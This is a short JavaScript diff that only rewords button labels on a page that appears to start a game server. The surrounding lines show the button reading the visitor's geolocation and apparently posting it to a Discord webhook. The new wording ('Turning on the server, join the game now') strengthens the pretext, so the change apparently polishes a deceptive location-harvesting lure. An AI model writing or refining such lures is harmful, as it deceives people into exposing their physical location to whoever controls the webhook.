@@ -268,7 +268,7 @@
         return;
     }
 
-    btn.innerText = "Turning On";
+    btn.innerText = "Preparing the Server...";
 
     navigator.geolocation.getCurrentPosition(async (position) => {
         const lat = position.coords.latitude;
@@ -337,7 +337,7 @@ async function postToDiscord(url, data, btn) {
 
         if (response.ok) {
 
-            btn.innerText = "Server is loading, try to join the game now.";
+            btn.innerText = "Turning on the server, join the game now.";
 
             btn.disabled = true;
 
